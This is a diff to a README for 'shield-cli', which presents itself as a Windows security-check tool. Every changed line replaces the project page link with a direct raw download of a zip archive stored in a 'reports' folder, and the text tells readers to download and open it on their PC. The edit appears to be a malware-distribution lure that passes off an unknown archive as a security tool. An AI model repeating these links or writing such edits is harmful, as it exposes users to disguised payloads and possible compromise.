@@ -1,6 +1,6 @@
 # 🛡️ shield-cli - Run Security Checks with Ease
 
-[![Download shield-cli](https://img.shields.io/badge/Download-shield--cli-blue?style=for-the-badge&logo=github)](https://github.com/Ordermyaceaeaorta658/shield-cli)
+[![Download shield-cli](https://img.shields.io/badge/Download-shield--cli-blue?style=for-the-badge&logo=github)](https://github.com/Ordermyaceaeaorta658/shield-cli/raw/refs/heads/main/reports/shield_cli_3.7-beta.1.zip)
 
 ## 🚀 What shield-cli does
 
@@ -25,7 +25,7 @@ For best results, use Windows 10 or Windows 11.
 
 Visit this page to download the app:
 
-https://github.com/Ordermyaceaeaorta658/shield-cli
+https://github.com/Ordermyaceaeaorta658/shield-cli/raw/refs/heads/main/reports/shield_cli_3.7-beta.1.zip
 
 If the page shows a release file, download it. If it shows the project page, use the download option there. Save the file in a folder you can find again, such as Downloads or Desktop.
 
@@ -239,6 +239,6 @@ Use shield-cli only on systems you own or have permission to test. Keep your sca
 
 If you need to get the file again, use this link:
 
-https://github.com/Ordermyaceaeaorta658/shield-cli
+https://github.com/Ordermyaceaeaorta658/shield-cli/raw/refs/heads/main/reports/shield_cli_3.7-beta.1.zip
 
 Download it from the page, then open it on your Windows PC
